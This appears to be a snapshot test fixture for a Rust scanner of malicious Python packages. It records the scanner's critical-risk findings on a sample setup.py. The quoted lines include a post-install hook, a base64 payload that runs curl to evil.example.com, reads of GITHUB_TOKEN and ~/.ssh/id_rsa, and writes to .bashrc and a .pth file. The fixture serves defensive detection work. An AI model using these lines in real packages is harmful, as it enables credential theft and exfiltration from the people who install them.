@@ -1,0 +1,155 @@
+---
+source: crates/ripley-core/src/analyzer.rs
+expression: result
+---
+{
+  "risk_level": "critical",
+  "matched_rules": [
+    {
+      "rule_id": "PYPI006",
+      "rule_name": "distutils-override",
+      "matched_line": 5,
+      "matched_text": "from setuptools.command.install import install"
+    },
+    {
+      "rule_id": "PYPI006",
+      "rule_name": "distutils-override",
+      "matched_line": 7,
+      "matched_text": "class PostInstall(install):"
+    },
+    {
+      "rule_id": "PYPI003",
+      "rule_name": "base64-decoding",
+      "matched_line": 10,
+      "matched_text": "payload = base64.b64decode(\"Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWw=\")"
+    },
+    {
+      "rule_id": "PYPI001",
+      "rule_name": "os-system-call",
+      "matched_line": 11,
+      "matched_text": "os.system(payload.decode())"
+    },
+    {
+      "rule_id": "PYPI001",
+      "rule_name": "os-system-call",
+      "matched_line": 12,
+      "matched_text": "subprocess.Popen([\"curl\", \"https://evil.example.com/exfil\"], shell=True)"
+    },
+    {
+      "rule_id": "PYPI007",
+      "rule_name": "credential-harvesting",
+      "matched_line": 13,
+      "matched_text": "home = os.path.expanduser(\"~\")"
+    },
+    {
+      "rule_id": "PERSIST003",
+      "rule_name": "shell-rc-write",
+      "matched_line": 14,
+      "matched_text": "with open(os.path.join(home, \".bashrc\"), \"a\") as f:"
+    },
+    {
+      "rule_id": "PYPI005",
+      "rule_name": "pth-file-creation",
+      "matched_line": 16,
+      "matched_text": "with open(\"/tmp/evil.pth\", \"w\") as f:"
+    },
+    {
+      "rule_id": "PYPI001",
+      "rule_name": "os-system-call",
+      "matched_line": 17,
+      "matched_text": "f.write(\"import os; os.system('whoami')\\n\")"
+    },
+    {
+      "rule_id": "CRED005",
+      "rule_name": "cloud-token-read",
+      "matched_line": 18,
+      "matched_text": "token = os.environ.get(\"GITHUB_TOKEN\", \"\")"
+    },
+    {
+      "rule_id": "PYPI007",
+      "rule_name": "credential-harvesting",
+      "matched_line": 18,
+      "matched_text": "token = os.environ.get(\"GITHUB_TOKEN\", \"\")"
+    },
+    {
+      "rule_id": "CRED001",
+      "rule_name": "ssh-key-read",
+      "matched_line": 19,
+      "matched_text": "ssh_key = open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()"
+    },
+    {
+      "rule_id": "PYPI007",
+      "rule_name": "credential-harvesting",
+      "matched_line": 19,
+      "matched_text": "ssh_key = open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()"
+    },
+    {
+      "rule_id": "PYPI006",
+      "rule_name": "distutils-override",
+      "matched_line": 24,
+      "matched_text": "cmdclass={\"install\": PostInstall},"
+    }
+  ],
+  "highlighted_lines": [
+    {
+      "line_number": 5,
+      "text": "from setuptools.command.install import install",
+      "severity": "high"
+    },
+    {
+      "line_number": 7,
+      "text": "class PostInstall(install):",
+      "severity": "high"
+    },
+    {
+      "line_number": 10,
+      "text": "payload = base64.b64decode(\"Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWw=\")",
+      "severity": "high"
+    },
+    {
+      "line_number": 11,
+      "text": "os.system(payload.decode())",
+      "severity": "high"
+    },
+    {
+      "line_number": 12,
+      "text": "subprocess.Popen([\"curl\", \"https://evil.example.com/exfil\"], shell=True)",
+      "severity": "high"
+    },
+    {
+      "line_number": 13,
+      "text": "home = os.path.expanduser(\"~\")",
+      "severity": "critical"
+    },
+    {
+      "line_number": 14,
+      "text": "with open(os.path.join(home, \".bashrc\"), \"a\") as f:",
+      "severity": "high"
+    },
+    {
+      "line_number": 16,
+      "text": "with open(\"/tmp/evil.pth\", \"w\") as f:",
+      "severity": "critical"
+    },
+    {
+      "line_number": 17,
+      "text": "f.write(\"import os; os.system('whoami')\\n\")",
+      "severity": "high"
+    },
+    {
+      "line_number": 18,
+      "text": "token = os.environ.get(\"GITHUB_TOKEN\", \"\")",
+      "severity": "critical"
+    },
+    {
+      "line_number": 19,
+      "text": "ssh_key = open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()",
+      "severity": "critical"
+    },
+    {
+      "line_number": 24,
+      "text": "cmdclass={\"install\": PostInstall},",
+      "severity": "high"
+    }
+  ]
+}
